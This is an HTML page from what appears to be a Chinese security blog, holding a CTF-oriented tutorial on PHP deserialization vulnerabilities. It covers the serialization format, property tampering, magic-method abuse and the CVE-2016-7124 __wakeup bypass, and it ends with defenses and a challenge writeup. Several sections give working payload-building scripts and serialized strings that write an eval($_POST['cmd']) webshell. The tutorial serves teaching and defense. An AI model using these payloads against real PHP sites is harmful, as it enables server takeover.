@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PHP反序列化漏洞 · pressure-J</title>
+<meta name="description" content="反序列化漏洞 = unserialize()接收用户输入 + 可利用的类 + 用户可控序列化内容">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/php-fan-xu-lie-hua-lou-dong.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="PHP反序列化漏洞 · pressure-J">
+<meta property="og:description" content="反序列化漏洞 = unserialize()接收用户输入 + 可利用的类 + 用户可控序列化内容">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>PHP反序列化漏洞</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-07-05">2026-07-05</time>
+          <span>4011 字</span>
+          <span>约 11 分钟</span>
+        </div>
+        <div class="chips post-tags"><span class="chip">CTF</span><span class="chip">Web安全</span><span class="chip">PHP</span></div>
+      </header>
+      <div class="content"><h2 id="_1">一、基本概念</h2>
+<h3 id="11">1.1 序列化与反序列化</h3>
+<ul>
+<li><strong>序列化（Serialization）</strong>：把内存中的对象 → 转换为可存储或传输的字符串</li>
+<li><strong>反序列化（Deserialization）</strong>：把字符串 → 还原为内存中的对象</li>
+</ul>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">// 序列化</span>
+<span class="x">$str = serialize($object);</span>
+
+<span class="x">// 反序列化</span>
+<span class="x">$object = unserialize($str);</span>
+</code></pre></div></div>
+
+<h3 id="12-php">1.2 PHP序列化格式</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>标记</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>s</code></td>
+<td>字符串 string</td>
+<td><code>s:5:"hello"</code></td>
+</tr>
+<tr>
+<td><code>i</code></td>
+<td>整数 integer</td>
+<td><code>i:42</code></td>
+</tr>
+<tr>
+<td><code>b</code></td>
+<td>布尔 boolean</td>
+<td><code>b:1</code>(true) / <code>b:0</code>(false)</td>
+</tr>
+<tr>
+<td><code>a</code></td>
+<td>数组 array</td>
+<td><code>a:1:{i:0;s:3:"hi";}</code></td>
+</tr>
+<tr>
+<td><code>O</code></td>
+<td>对象 object</td>
+<td><code>O:11:"ctfshowUser":3:{...}</code></td>
+</tr>
+<tr>
+<td><code>N</code></td>
+<td>null</td>
+<td><code>N;</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="13">1.3 格式解析示例</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>O:11:"ctfshowUser":3:{s:8:"username";s:5:"xxxxx";s:8:"password";s:5:"xxxxx";s:6:"isVip";b:1;}
+</code></pre></div></div>
+
+<ul>
+<li><code>O:11</code> → 对象，类名长度11</li>
+<li><code>"ctfshowUser"</code> → 类名</li>
+<li><code>:3</code> → 3个属性</li>
+<li><code>s:8:"username"</code> → 字符串属性，长度8</li>
+<li><code>b:1</code> → 布尔值 true</li>
+</ul>
+<hr />
+<h2 id="_2">二、漏洞原理</h2>
+<h3 id="21">2.1 核心条件</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>反序列化漏洞 = unserialize()接收用户输入 + 可利用的类 + 用户可控序列化内容
+</code></pre></div></div>
+
+<h3 id="22">2.2 攻击流程</h3>
+<ol>
+<li>攻击者构造一个恶意的序列化字符串</li>
+<li>通过某种方式（GET/POST/Cookie）传给服务器</li>
+<li>服务器 <code>unserialize()</code> 还原成对象</li>
+<li>对象属性已经是攻击者设定的值，绕过正常逻辑</li>
+</ol>
+<hr />
+<h2 id="ctf">三、常见CTF题型</h2>
+<h3 id="31">3.1 属性篡改（绕过验证）</h3>
+<p><strong>目标</strong>：通过反序列化直接设置对象属性，绕过登录验证</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">class ctfshowUser{</span>
+<span class="x">    public $username='xxxxx';</span>
+<span class="x">    public $password='xxxxx';</span>
+<span class="x">    public $isVip=false;</span>
+
+<span class="x">    public function login($u,$p){</span>
+<span class="x">        return $this-&gt;username===$u &amp;&amp; $this-&gt;password===$p;</span>
+<span class="x">    }</span>
+<span class="x">    public function vipOneKeyGetFlag(){</span>
+<span class="x">        if($this-&gt;isVip){</span>
+<span class="x">            global $flag;</span>
+<span class="x">            echo "your flag is ".$flag;</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre></div></div>
+
+<p><strong>Payload构造</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">ctfshowUser</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$username</span><span class="o">=</span><span class="s1">'xxxxx'</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$password</span><span class="o">=</span><span class="s1">'xxxxx'</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$isVip</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>  <span class="c1">// 直接设为true</span>
+<span class="p">}</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshowUser</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
+<span class="c1">// Cookie: user=&lt;输出结果&gt;</span>
+<span class="c1">// URL: ?u=xxxxx&amp;p=xxxxx</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="32">3.2 魔术方法利用</h3>
+<p>PHP中自动触发的魔术方法：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__construct()</code></td>
+<td>对象创建时（new）</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁时</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td>反序列化完成时</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被当字符串使用时</td>
+</tr>
+<tr>
+<td><code>__call()</code></td>
+<td>调用不存在的方法时</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>危险场景</strong>：类中存在 <code>__destruct()</code> 或 <code>__wakeup()</code> 且包含危险操作</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">class test{</span>
+<span class="x">    public $name;</span>
+<span class="x">    public function __destruct(){</span>
+<span class="x">        file_put_contents("shell.php", $this-&gt;name);  // 写文件</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+
+<span class="x">// 攻击者构造：</span>
+<span class="x">// O:4:"test":1:{s:4:"name";s:31:"</span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">";}</span>
+<span class="x">// → 对象销毁时自动写入webshell</span>
+</code></pre></div></div>
+
+<h3 id="33-__wakeupcve-2016-7124">3.3 绕过 <code>__wakeup()</code>（CVE-2016-7124）</h3>
+<p><strong>适用版本</strong>：PHP &lt; 5.6.25 或 PHP 7.x &lt; 7.0.10</p>
+<p><strong>原理</strong>：如果序列化字符串中声明的属性数量 &gt; 类实际属性数量，<code>__wakeup()</code> 会被跳过</p>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">class test{</span>
+<span class="x">    public $name = "fairy";  // 只有1个属性</span>
+
+<span class="x">    public function __wakeup(){</span>
+<span class="x">        foreach(get_object_vars($this) as $k =&gt; $v){</span>
+<span class="x">            $this-&gt;$k = null;  // 清空所有属性</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">    public function __destruct(){</span>
+<span class="x">        $fp = fopen("0day.php","w");</span>
+<span class="x">        fputs($fp, $this-&gt;name);  // 写入文件</span>
+<span class="x">        fclose($fp);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre></div></div>
+
+<p><strong>正常序列化</strong>（会触发 <code>__wakeup</code>）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>O:4:"test":1:{s:4:"name";s:34:"&lt;?php eval($_POST["cmd"]); ?&gt;";}
+</code></pre></div></div>
+
+<p><strong>绕过</strong>（属性数量1改为2）：</p>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>O:4:"test":2:{s:4:"name";s:34:"&lt;?php eval($_POST["cmd"]); ?&gt;";}
+</code></pre></div></div>
+
+<p><strong>Payload构造</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">'&lt;?php eval($_POST["cmd"]); ?&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
+<span class="nv">$s</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">':1:'</span><span class="p">,</span> <span class="s1">':2:'</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>  <span class="c1">// 绕过__wakeup</span>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<hr />
+<h2 id="_3">四、传入方式</h2>
+<p>反序列化入口可能在不同的超全局变量中：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>传入方式</th>
+<th>对应变量</th>
+<th>常见参数名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL参数</td>
+<td><code>$_GET</code></td>
+<td><code>?data=...</code></td>
+</tr>
+<tr>
+<td>POST数据</td>
+<td><code>$_POST</code></td>
+<td>表单提交</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td><code>$_COOKIE</code></td>
+<td><code>Cookie: user=...</code></td>
+</tr>
+<tr>
+<td>HTTP头</td>
+<td><code>$_SERVER</code> / <code>getallheaders()</code></td>
+<td>自定义头</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>注意</strong>：Cookie中的特殊字符（如双引号）可能需要URL编码，PHP的 <code>$_COOKIE</code> 会自动解码。</p>
+<hr />
+<h2 id="_4">五、防御方式</h2>
+<ol>
+<li><strong>不要对用户输入使用 <code>unserialize()</code></strong>，用 <code>json_decode()</code> 代替</li>
+<li>如果必须使用，限制可反序列化的类：<br />
+<code>php
+   unserialize($data, ['allowed_classes' =&gt; false]); // 禁止自动创建对象</code></li>
+<li>对输入数据做严格的校验和过滤</li>
+<li>升级PHP版本，修补已知漏洞（如CVE-2016-7124）</li>
+</ol>
+<hr />
+<h2 id="_5">六、解题思路总结</h2>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>1. 审计源码，找到 unserialize() 入口
+2. 确定入口位置（GET/POST/Cookie）
+3. 分析类的属性和方法，找到可利用的点：
+   - 属性篡改（isVip、password等）
+   - 魔术方法（__destruct、__wakeup等）
+4. 构造序列化payload
+5. 注意绕过技巧（属性数量篡改等）
+6. 通过正确的方式传入payload
+</code></pre></div></div>
+
+<hr />
+<h2 id="__wakeup">实战：私有属性 + __wakeup 绕过（完整题解）</h2>
+<blockquote>
+<p>题目：DASCTF「I have a cat!」，flag <code>CTF2{ce0c7724-5671-4b25-ae52-ab942a579230}</code><br />
+完整 writeup（逐层实测对照表、回显现形位置、命令行传 NUL 的正确姿势）见 <code>Web安全-PHP反序列化wakeup绕过WriteUp.md</code></p>
+</blockquote>
+<h3 id="_6">三条规则补在这里</h3>
+<ol>
+<li><code>private</code> 属性的序列化键名是 <code>\x00类名\x00属性名</code>（两端不可见，字节 <code>0x00</code>），长度<strong>按字节</strong>算。<br />
+<code>\x00Name\x00username</code> = 1+4+1+8 = <strong>14</strong>；写成 <code>s:8:"username"</code> 不报错，但赋值落空，类的真实属性保持默认值。</li>
+<li>绕过 <code>__wakeup</code> 保护的是 <code>__destruct</code> 的条件：<code>unserialize()</code> 内部是<strong>先填属性 → 再调 <code>__wakeup()</code></strong>，而 <code>__destruct()</code> 在脚本结束、对象释放时才跑，中间没有别的钩子会再改属性。<br />
+   所以只要 <code>__wakeup</code> 被跳过，我们塞进去的值就原样活到析构。</li>
+<li>判据是「声明的属性个数 vs <strong>payload 里实际给了几个成员</strong>」：<br />
+   - 声明 &gt; 实际 → <code>__wakeup</code> 被跳过，属性照常赋值 ✅<br />
+   - 声明 &lt; 实际 → <strong>整体解析失败</strong>，所有属性退回类默认值（不是"部分赋值"）<br />
+   - 声明 = 实际 → 正常解析，<code>__wakeup</code> 执行</li>
+</ol>
+<h3 id="_7">单字段判据（最快的验证手法）</h3>
+<p>思路是<strong>只塞会暴露 <code>__wakeup</code> 是否执行的那个字段</strong>：给 <code>username=admin</code> 而不给 <code>password</code>，看回显的 <code>You name is: X</code>。</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>声明个数</th>
+<th>回显</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>You name is: guest</code></td>
+<td><code>__wakeup</code> 执行了</td>
+</tr>
+<tr>
+<td>2 / 3</td>
+<td><code>You name is: admin</code></td>
+<td><code>__wakeup</code> 被跳过 ✅</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="_8">一个反直觉点</h3>
+<p><code>__destruct</code> 里的 <code>echo</code> 输出排在整份 HTML 的 <code>&lt;/html&gt;</code> <strong>之后</strong>。定位回显时若只截页面中间那段 PHP 标签区域，会误判成"解析失败、没有任何输出"——<strong>永远拿整个响应搜关键字</strong>。</p></div>
+      <div class="post-nav"><a class="pn-item prev" href="kali-gong-ju-de-shi-yong.html"><span>← 上一篇</span><strong>kali工具的使用</strong></a><a class="pn-item next" href="linux-log-analysis-basics.html"><span>下一篇 →</span><strong>Linux日志分析基础</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、基本概念</a><a href="#11" class="toc-lv3">1.1 序列化与反序列化</a><a href="#12-php" class="toc-lv3">1.2 PHP序列化格式</a><a href="#13" class="toc-lv3">1.3 格式解析示例</a><a href="#_2" class="toc-lv2">二、漏洞原理</a><a href="#21" class="toc-lv3">2.1 核心条件</a><a href="#22" class="toc-lv3">2.2 攻击流程</a><a href="#ctf" class="toc-lv2">三、常见CTF题型</a><a href="#31" class="toc-lv3">3.1 属性篡改（绕过验证）</a><a href="#32" class="toc-lv3">3.2 魔术方法利用</a><a href="#33-__wakeupcve-2016-7124" class="toc-lv3">3.3 绕过 __wakeup()（CVE-2016-7124）</a><a href="#_3" class="toc-lv2">四、传入方式</a><a href="#_4" class="toc-lv2">五、防御方式</a><a href="#_5" class="toc-lv2">六、解题思路总结</a><a href="#__wakeup" class="toc-lv2">实战：私有属性 + __wakeup 绕过（完整题解）</a><a href="#_6" class="toc-lv3">三条规则补在这里</a><a href="#_7" class="toc-lv3">单字段判据（最快的验证手法）</a><a href="#_8" class="toc-lv3">一个反直觉点</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
